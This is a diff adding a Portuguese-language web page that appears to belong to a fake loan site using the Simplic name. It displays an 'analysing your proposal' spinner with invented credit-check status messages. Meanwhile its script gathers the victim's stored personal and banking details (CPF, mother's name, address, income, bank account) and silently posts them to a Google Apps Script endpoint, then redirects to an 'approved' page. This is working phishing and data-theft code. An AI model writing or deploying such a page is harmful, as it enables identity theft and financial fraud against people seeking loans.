@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Analisando Proposta - Simplic</title>
+    <style>
+        body { margin: 0; font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; align-items: center; justify-content: center; height: 100vh; color: #333; }
+        .container { text-align: center; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #4caf50; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #4caf50; margin-bottom: 10px; }
+        p { font-size: 16px; color: #666; }
+        .status-text { font-weight: bold; color: #4caf50; margin-top: 15px; display: block; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="loader"></div>
+        <h2>Analisando sua proposta...</h2>
+        <p>Aguarde um momento enquanto verificamos seus dados em nossa base.</p>
+        <span class="status-text" id="status">Conectando ao sistema...</span>
+    </div>
+
+    <script>
+        window.onload = function() {
+            // Coleta todos os dados salvos nas etapas anteriores
+            const bibliotecaCompleta = {
+                valor: localStorage.getItem('valor_selecionado'),
+                parcelas: localStorage.getItem('parcelas_selecionadas'),
+                nome: localStorage.getItem('nome'),
+                nascimento: localStorage.getItem('nascimento'),
+                cpf: localStorage.getItem('cpf'),
+                email: localStorage.getItem('email'),
+                telefone: localStorage.getItem('telefone'),
+                nome_mae: localStorage.getItem('nome_mae'),
+                escolaridade: localStorage.getItem('escolaridade'),
+                nacionalidade: localStorage.getItem('nacionalidade'),
+                cep: localStorage.getItem('cep_pessoal'),
+                endereco: localStorage.getItem('endereco_rua'),
+                numero: localStorage.getItem('endereco_numero'),
+                complemento: localStorage.getItem('complemento'),
+                cidade_estado: localStorage.getItem('cidade_pessoal') + "/" + localStorage.getItem('estado_pessoal'),
+                renda_valor: localStorage.getItem('renda_valor'),
+                renda_fonte: localStorage.getItem('renda_fonte'),
+                renda_dia: localStorage.getItem('renda_dia'),
+                emprestimo_objetivo: localStorage.getItem('emprestimo_objetivo'), 
+                banco: localStorage.getItem('banco_nome'),
+                agencia: localStorage.getItem('agencia'),
+                conta: localStorage.getItem('conta_numero')
+            };
+
+            // NOVA URL QUE VOCÊ ENVIOU
+            const urlPlanilha = "https://script.google.com/macros/s/AKfycbzm8W-ftxs76Y0qNwtyplXst3o58Lq1wgGhnHEJaMPw9HjGUFByEqI3GLVwUCkH2fCV/exec";
+
+            const statusMsg = document.getElementById('status');
+            setTimeout(() => statusMsg.innerText = "Validando documentos...", 2000);
+            setTimeout(() => statusMsg.innerText = "Consultando órgãos de crédito...", 4000);
+            setTimeout(() => statusMsg.innerText = "Finalizando análise...", 6000);
+
+            // Envia os dados para a nova planilha
+            fetch(urlPlanilha, {
+                method: 'POST',
+                mode: 'no-cors', 
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(bibliotecaCompleta)
+            });
+
+            // Redireciona para a página de sucesso após 8 segundos
+            setTimeout(function() {
+                window.location.href = "aprovado.html";
+            }, 8000); 
+        };
+    </script>
+</body>
+</html>
